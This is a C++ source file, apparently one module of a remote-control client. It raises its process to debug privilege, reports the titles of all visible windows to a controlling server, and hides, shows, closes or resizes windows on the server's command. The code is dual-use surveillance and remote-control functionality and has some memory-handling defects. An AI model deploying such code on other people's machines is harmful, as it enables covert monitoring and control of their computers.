#include "pch.h"
#include "WindowManager.h"
#include"ProcessHelper.h"
#include"Common.h"
CWindowManager::CWindowManager(CIocpClient* IocpClient) 
	:CManager(IocpClient)
{
	//回传数据包到服务器

	EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);

	//当前客户端扫描所有正在运行的窗口信息
	SendClientWindowList();
}

CWindowManager::~CWindowManager()
{
	_tprintf(_T("~CWindowManager()\r\n"));
	EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
}

void CWindowManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{

	case CLIENT_WINDOW_MANAGER_REFRESH_REQUIRE:
	{


		HWND Hwnd = *((HWND*)(BufferData + 1));
		//::PostMessage(Hwnd, WM_CLOSE, 0, 0);


		//Sleep(100);

		ReSendClientWindowList();

		break;
	}

	case CLIENT_WINDOW_MANAGER_CLOSE_REQUIRE:
	{


		HWND Hwnd = *((HWND*)(BufferData + 1));
		::PostMessage(Hwnd, WM_CLOSE, 0, 0);


		Sleep(100);
		
	//	SendClientWindowList();

		break;
	}
	case CLIENT_WINDOW_MANAGER_HIDE_REQUIRE:
	{

		DWORD Hwnd;
		memcpy((void*)&Hwnd, &BufferData[1], sizeof(HWND));            //得到窗口句柄
		ShowWindow((HWND__*)Hwnd, SW_HIDE);

		//SendClientWindowList();

		break;
	}
	case CLIENT_WINDOW_MANAGER_RECOVER_REQUIRE:
	{

		DWORD Hwnd;
		memcpy((void*)&Hwnd, &BufferData[1], sizeof(HWND));            //得到窗口句柄
		ShowWindow((HWND__*)Hwnd, SW_SHOW);

		//SendClientWindowList();

		break;
	}
	case CLIENT_WINDOW_MANAGER_MAX_REQUIRE:
	{

		DWORD Hwnd;
		memcpy((void*)&Hwnd, &BufferData[1], sizeof(HWND));            //得到窗口句柄
		//m_CurrentWorking = HideWindow;
		ShowWindow((HWND__*)Hwnd, SW_MAXIMIZE);

		//SendClientWindowList();

		break;
	}
	case CLIENT_WINDOW_MANAGER_MIN_REQUIRE:
	{

		DWORD Hwnd;
		memcpy((void*)&Hwnd, &BufferData[1], sizeof(HWND));            //得到窗口句柄
		//m_CurrentWorking = HideWindow;
		ShowWindow((HWND__*)Hwnd, SW_MINIMIZE);

		//SendClientWindowList();

		break;
	}

	}

}

BOOL CWindowManager::SendClientWindowList()
{
	LPBYTE	BufferData = NULL;
	EnumWindows((WNDENUMPROC)EnumWindowProcedure, (LPARAM)&BufferData);

	if (BufferData != NULL)
	{
		BufferData[0] = CLIENT_WINDOW_MANAGER_REPLY;
	}
	
	//将数据包发送到服务端
	m_IocpClient->OnSending((char*)BufferData, LocalSize(BufferData));
	LocalFree(BufferData);

	return TRUE;
}

BOOL CWindowManager::ReSendClientWindowList()
{

	LPBYTE	BufferData = NULL;
	EnumWindows((WNDENUMPROC)EnumWindowProcedure, (LPARAM)&BufferData);

	if (BufferData != NULL)
	{
		BufferData[0] = CLIENT_WINDOW_MANAGER_REFRESH_REPLY;
	}

	//将数据包发送到服务端
	m_IocpClient->OnSending((char*)BufferData, LocalSize(BufferData));
	LocalFree(BufferData);

	return TRUE;
}

BOOL CWindowManager::EnumWindowProcedure(HWND Hwnd, LPARAM ParameterData)
{
	DWORD	BufferLength = 0;
	DWORD	Offset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	BufferData = *(LPBYTE*)ParameterData;

	char  WindowTitleName[0x400] = { 0 };
	memset(WindowTitleName, 0, sizeof(WindowTitleName));
	//得到系统传递进来的窗口句柄的窗口标题
	GetWindowText(Hwnd, WindowTitleName, sizeof(WindowTitleName));
	//这里判断 窗口是否可见 或标题为空
	if (!IsWindowVisible(Hwnd) || lstrlen(WindowTitleName) == 0)
		return TRUE;
	//同进程管理一样我们注意他的发送到主控端的数据结构

	if (BufferData == NULL)
	{
		BufferData = (LPBYTE)LocalAlloc(LPTR, 1);  //暂时分配缓冲区 
	}

	//[Flag][HWND][WindowTitleName]\0[HWND][WindowTitleName]\0
	BufferLength = sizeof(HWND) + lstrlen(WindowTitleName) + 1;
	Offset = LocalSize(BufferData);  //1
									 //重新计算缓冲区大小
	BufferData = (LPBYTE)LocalReAlloc(BufferData, Offset + BufferLength, LMEM_ZEROINIT | LMEM_MOVEABLE);
	//下面两个memcpy就能看到数据结构为 hwnd+窗口标题+0
	memcpy((BufferData + Offset), &Hwnd, sizeof(HWND));
	memcpy(BufferData + Offset + sizeof(HWND), WindowTitleName, lstrlen(WindowTitleName) + 1);

	*(LPBYTE*)ParameterData = BufferData;

	return TRUE;
}
